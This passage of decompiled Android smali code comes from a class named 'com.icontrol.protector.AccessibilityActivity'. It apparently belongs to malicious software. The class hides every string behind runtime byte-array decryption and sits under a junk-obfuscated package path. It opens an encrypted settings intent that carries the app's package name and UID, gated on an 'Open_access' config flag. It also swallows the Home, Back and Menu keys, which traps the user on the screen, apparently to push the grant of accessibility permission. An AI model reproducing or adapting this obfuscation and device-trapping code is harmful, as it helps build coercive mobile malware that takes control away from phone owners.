    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v2, v4, v5}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_5

    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {p0}, Landroid/content/Context;->getTheme()Landroid/content/res/Resources$Theme;

    move-result-object v4

    invoke-virtual {v2, p1, v4}, Landroid/content/res/Resources;->getDrawable(ILandroid/content/res/Resources$Theme;)Landroid/graphics/drawable/Drawable;

    move-result-object p1

    if-eqz p1, :cond_4

    invoke-virtual {p1}, Landroid/graphics/drawable/Drawable;->getIntrinsicWidth()I

    move-result v2

    if-lez v2, :cond_4

    invoke-virtual {p1}, Landroid/graphics/drawable/Drawable;->getIntrinsicHeight()I

    move-result v2

    if-lez v2, :cond_4

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v1

    invoke-virtual {v1, p1}, Landroid/view/Window;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V

    goto :goto_3

    :cond_4
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    new-instance v2, Landroid/graphics/drawable/ColorDrawable;

    new-array v3, v3, [B

    fill-array-data v3, :array_d

    new-array v1, v1, [B

    fill-array-data v1, :array_e

    invoke-static {v3, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-direct {v2, v1}, Landroid/graphics/drawable/ColorDrawable;-><init>(I)V

    goto :goto_2

    :cond_5
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    new-instance v2, Landroid/graphics/drawable/ColorDrawable;

    new-array v3, v3, [B

    fill-array-data v3, :array_f

    new-array v1, v1, [B

    fill-array-data v1, :array_10

    invoke-static {v3, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-direct {v2, v1}, Landroid/graphics/drawable/ColorDrawable;-><init>(I)V

    :goto_2
    invoke-virtual {p1, v2}, Landroid/view/Window;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V

    :goto_3
    iget-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    invoke-virtual {p1, v0}, Landroid/app/AlertDialog;->getButton(I)Landroid/widget/Button;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessibilityActivity;->l(Landroid/widget/Button;)V

    iget-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    const/4 v0, -0x3

    invoke-virtual {p1, v0}, Landroid/app/AlertDialog;->getButton(I)Landroid/widget/Button;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessibilityActivity;->m(Landroid/widget/Button;)V

    :cond_6
    return-void

    nop

    :array_0
    .array-data 1
        0x71t
        0x1t
        0x3et
        0x57t
    .end array-data

    :array_1
    .array-data 1
        0x51t
        0x7at
        0xdt
        0x2at
        -0x6ct
        -0x40t
        0x4et
        -0x3at
    .end array-data

    :array_2
    .array-data 1
        0x50t
        0x34t
        -0x39t
        0x29t
        -0x52t
        0x3t
        -0x73t
        0x19t
    .end array-data

    :array_3
    .array-data 1
        -0x51t
        -0x13t
        0x19t
        0x78t
        0x11t
        0x15t
        -0x79t
        0x27t
        -0x5et
        -0x1ct
    .end array-data

    nop

    :array_4
    .array-data 1
        -0x32t
        -0x7ft
        0x7ct
        0xat
        0x65t
        0x41t
        -0x12t
        0x53t
    .end array-data

    :array_5
    .array-data 1
        0x16t
        0x40t
    .end array-data

    nop

    :array_6
    .array-data 1
        0x7ft
        0x24t
        -0x27t
        -0x4ct
        -0x3et
        0x19t
        -0x2dt
        -0x52t
    .end array-data

    :array_7
    .array-data 1
        0x4et
        -0x7et
        0x1bt
        -0x5t
        -0x4et
        -0x1t
        0x1t
    .end array-data

    :array_8
    .array-data 1
        0x2ft
        -0x14t
        0x7ft
        -0x77t
        -0x23t
        -0x6at
        0x65t
        -0x23t
    .end array-data

    :array_9
    .array-data 1
        0x62t
        0x5t
        0x69t
        -0x2at
        0x51t
        0x60t
        0x21t
    .end array-data

    :array_a
    .array-data 1
        0x0t
        0x69t
        0x8t
        -0x4bt
        0x3at
        0x15t
        0x48t
        -0x3ct
    .end array-data

    :array_b
    .array-data 1
        -0x78t
        0x1at
        0x4ct
        0x11t
        -0x38t
        -0x6t
        0x40t
        -0x5ct
    .end array-data

    :array_c
    .array-data 1
        -0x14t
        0x68t
        0x2dt
        0x66t
        -0x57t
        -0x68t
        0x2ct
        -0x3ft
    .end array-data

    :array_d
    .array-data 1
        0x1ft
        -0x19t
        -0x6bt
        -0x6ct
        -0x17t
        -0x71t
        0x5at
    .end array-data

    :array_e
    .array-data 1
        0x3ct
        -0x29t
        -0x5bt
        -0x5ct
        -0x27t
        -0x41t
        0x6at
        0x56t
    .end array-data

    :array_f
    .array-data 1
        -0x72t
        0x3dt
        0x59t
        0x37t
        0x25t
        0x44t
        -0x21t
    .end array-data

    :array_10
    .array-data 1
        -0x53t
        0xdt
        0x69t
        0x7t
        0x15t
        0x74t
        -0x11t
        -0x46t
    .end array-data
.end method

.method private l(Landroid/widget/Button;)V
    .locals 3

    .line 1
    if-nez p1, :cond_0

    return-void

    :cond_0
    new-instance v0, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v0}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/high16 v1, 0x41400000    # 12.0f

    invoke-direct {p0, v1}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v1

    invoke-virtual {v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    invoke-virtual {p1, v0}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    const/4 v0, -0x1

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setTextColor(I)V

    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setAllCaps(Z)V

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setMinHeight(I)V

    invoke-virtual {p1, v0}, Landroid/view/View;->setMinimumHeight(I)V

    const/high16 v0, 0x42100000    # 36.0f

    invoke-direct {p0, v0}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v0

    float-to-int v0, v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setHeight(I)V

    const/high16 v0, 0x41800000    # 16.0f

    invoke-direct {p0, v0}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v0

    float-to-int v0, v0

    const/high16 v1, 0x40800000    # 4.0f

    invoke-direct {p0, v1}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v1

    float-to-int v1, v1

    invoke-virtual {p1, v0, v1, v0, v1}, Landroid/view/View;->setPadding(IIII)V

    return-void

    :array_0
    .array-data 1
        -0x30t
        0x56t
        -0xbt
        0xct
        0x15t
        0x69t
        -0x24t
    .end array-data

    :array_1
    .array-data 1
        -0xdt
        0x64t
        -0x3ct
        0x35t
        0x23t
        0x2ft
        -0x11t
        -0x30t
    .end array-data
.end method

.method private m(Landroid/widget/Button;)V
    .locals 7

    .line 1
    if-nez p1, :cond_0

    return-void

    :cond_0
    new-instance v0, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v0}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/high16 v2, 0x41400000    # 12.0f

    invoke-direct {p0, v2}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v2

    invoke-virtual {v0, v2}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    const/high16 v2, 0x40000000    # 2.0f

    invoke-direct {p0, v2}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v2

    float-to-int v2, v2

    const/4 v3, 0x7

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v0, v2, v4}, Landroid/graphics/drawable/GradientDrawable;->setStroke(II)V

    invoke-virtual {p1, v0}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    new-array v0, v3, [B

    fill-array-data v0, :array_2

    new-array v2, v5, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setTextColor(I)V

    invoke-virtual {p1, v1}, Landroid/widget/TextView;->setAllCaps(Z)V

    invoke-virtual {p1, v1}, Landroid/widget/TextView;->setMinHeight(I)V

    invoke-virtual {p1, v1}, Landroid/view/View;->setMinimumHeight(I)V

    const/high16 v0, 0x42100000    # 36.0f

    invoke-direct {p0, v0}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v0

    float-to-int v0, v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setHeight(I)V

    const/high16 v0, 0x41800000    # 16.0f

    invoke-direct {p0, v0}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v0

    float-to-int v0, v0

    const/high16 v1, 0x40800000    # 4.0f

    invoke-direct {p0, v1}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v1

    float-to-int v1, v1

    invoke-virtual {p1, v0, v1, v0, v1}, Landroid/view/View;->setPadding(IIII)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x22t
        -0x68t
        0xbt
        0x23t
        -0x41t
        -0x74t
        0x15t
    .end array-data

    :array_1
    .array-data 1
        -0x3t
        -0x56t
        0x3at
        0x1at
        -0x77t
        -0x36t
        0x26t
        0x59t
    .end array-data

    :array_2
    .array-data 1
        -0x71t
        0x3dt
        0x2t
        -0x75t
        0x65t
        -0x3t
        0x7et
    .end array-data

    :array_3
    .array-data 1
        -0x54t
        0xft
        0x33t
        -0x4et
        0x53t
        -0x45t
        0x4dt
        0x64t
    .end array-data
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/t30;->a:I

    invoke-virtual {p0, p1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object p1

    sget-object v0, Lcom/icontrol/protector/My_Configs;->Open_access:Ljava/lang/String;

    const/4 v1, 0x1

    new-array v1, v1, [B

    const/4 v2, 0x0

    const/16 v3, 0x13

    aput-byte v3, v1, v2

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->p:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    new-instance p1, Landroid/content/Intent;

    const/16 v0, 0x2f

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    new-array v1, v2, [B

    fill-array-data v1, :array_2

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/16 v0, 0x21

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    new-array v1, v2, [B

    fill-array-data v1, :array_4

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v0, 0x18

    new-array v0, v0, [B

    fill-array-data v0, :array_5

    new-array v1, v2, [B

    fill-array-data v1, :array_6

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v1

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const/high16 v0, 0x10000000

    :try_start_0
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sget-object v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->p:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    goto :goto_1

    :cond_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/g0;

    invoke-direct {v1, p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/g0;-><init>(Lcom/icontrol/protector/AccessibilityActivity;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        0x22t
        0x51t
        0x1dt
        0x15t
        0x3ct
        0x61t
        -0xct
        0x33t
    .end array-data

    :array_1
    .array-data 1
        0x41t
        0x76t
        -0x35t
        0x61t
        -0x53t
        -0x44t
        0x20t
        -0x24t
        0x53t
        0x7dt
        -0x25t
        0x67t
        -0x55t
        -0x45t
        0x23t
        -0x7ft
        0xet
        0x4bt
        -0x19t
        0x5ct
        -0x6bt
        -0x76t
        0x16t
        -0x49t
        0x73t
        0x4ct
        -0x3t
        0x5at
        -0x7ft
        -0x7ft
        0x1t
        -0x4at
        0x7ft
        0x4bt
        -0x16t
        0x47t
        -0x6at
        -0x64t
        0xat
        -0x4bt
        0x7ft
        0x5ct
        -0x1at
        0x52t
        -0x72t
        -0x66t
        0x3t
    .end array-data

    :array_2
    .array-data 1
        0x20t
        0x18t
        -0x51t
        0x13t
        -0x3et
        -0x2bt
        0x44t
        -0xet
    .end array-data

    :array_3
    .array-data 1
        -0x76t
        0x72t
        -0x7t
        0x48t
        -0x5at
        -0x65t
        -0x3ft
        0x68t
        -0x7et
        0x72t
        -0x17t
        0x5ft
        -0x59t
        -0x7at
        -0x75t
        0x23t
        -0x6dt
        0x68t
        -0x11t
        0x5bt
        -0x19t
        -0x5et
        -0x1ct
        0x5t
        -0x60t
        0x5dt
        -0x26t
        0x7ft
        -0x6at
        -0x44t
        -0x1ct
        0xbt
        -0x52t
    .end array-data

    nop

    :array_4
    .array-data 1
        -0x15t
        0x1ct
        -0x63t
        0x3at
        -0x37t
        -0xet
        -0x5bt
        0x46t
    .end array-data

    :array_5
    .array-data 1
        0x5dt
        0x6ct
        0x52t
        0x42t
        -0x2ft
        -0x16t
        0x33t
        0x43t
        0x55t
        0x6ct
        0x42t
        0x55t
        -0x30t
        -0x9t
        0x79t
        0x8t
        0x44t
        0x76t
        0x44t
        0x51t
        -0x70t
        -0x2at
        0x1et
        0x29t
    .end array-data

    :array_6
    .array-data 1
        0x3ct
        0x2t
        0x36t
        0x30t
        -0x42t
        -0x7dt
        0x57t
        0x6dt
    .end array-data
.end method

.method public onDestroy()V
    .locals 1

    iget-object v0, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/app/Dialog;->isShowing()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/Dialog;->dismiss()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x3

    const/4 v0, 0x1

    if-ne p1, p2, :cond_0

    return v0

    :cond_0
    const/4 p2, 0x4

    if-ne p1, p2, :cond_1

    return v0

    :cond_1
    const/16 p2, 0x52

    if-ne p1, p2, :cond_2

    return v0

    :cond_2
    const/4 p1, 0x0

    return p1
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
